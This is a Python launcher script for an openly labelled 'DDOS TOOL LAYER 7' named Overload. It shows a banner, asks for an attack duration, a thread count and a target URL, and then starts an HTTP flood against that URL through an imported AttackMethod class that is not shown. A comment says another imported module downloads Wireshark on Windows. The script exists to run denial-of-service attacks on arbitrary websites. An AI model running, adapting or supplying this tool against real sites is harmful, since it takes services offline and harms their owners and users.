# -*- coding: utf-8 -*-

# Created by nuvem and tsk

import os
import sys

from colorama import Fore

# Changing CWD to the canonical path of the file.
os.chdir(os.path.dirname(os.path.realpath(__file__)))

try:
    os.system("cls" if os.name == "nt" else "clear")

    # Tries to download Wireshark if Windows OS is detected.
    import tools.addons.wireshark
    from tools.method import AttackMethod

except ImportError as err:
    from tools.crash import CriticalError

    CriticalError("Failed to import some packages!", err)


if __name__ == "__main__":

    logo = """
  ▒█████   ██▒   █▓▓█████  ██▀███   ██▓     ▒█████   ▄▄▄      ▓█████▄ 
  ▒██▒  ██▒▓██░   █▒▓█   ▀ ▓██ ▒ ██▒▓██▒    ▒██▒  ██▒▒████▄    ▒██▀ ██▌
  ▒██░  ██▒ ▓██  █▒░▒███   ▓██ ░▄█ ▒▒██░    ▒██░  ██▒▒██  ▀█▄  ░██   █▌
  ▒██   ██░  ▒██ █░░▒▓█  ▄ ▒██▀▀█▄  ▒██░    ▒██   ██░░██▄▄▄▄██ ░▓█▄   ▌
  ░ ████▓▒░   ▒▀█░  ░▒████▒░██▓ ▒██▒░██████▒░ ████▓▒░ ▓█   ▓██▒░▒████▓ 
  ░ ▒░▒░▒░    ░ ▐░  ░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░▓  ░░ ▒░▒░▒░  ▒▒   ▓▒█░ ▒▒▓  ▒ 
    ░ ▒ ▒░    ░ ░░   ░ ░  ░  ░▒ ░ ▒░░ ░ ▒  ░  ░ ▒ ▒░   ▒   ▒▒ ░ ░ ▒  ▒ 
  ░ ░ ░ ▒       ░░     ░     ░░   ░   ░ ░   ░ ░ ░ ▒    ░   ▒    ░ ░  ░ 
      ░ ░        ░     ░  ░   ░         ░  ░    ░ ░        ░  ░   ░    
                ░                                               ░     
  """

    CRED2 = "\33[91m"
    print(CRED2 + logo + CRED2)
    print("├───DDOS TOOL LAYER 7")

    time = int(input(f"{Fore.RED}│   ├───TIME: {Fore.RESET}"))
    threads = int(input(f"{Fore.RED}│   └───THREADS: {Fore.RESET}"))
    target = str(input(f"{Fore.RED}│   └───URL: {Fore.RESET}"))

    with AttackMethod(
        duration=time, method_name="HTTP", threads=threads, target=target
    ) as Flood:
        Flood.Start()
else:
    sys.exit(1)
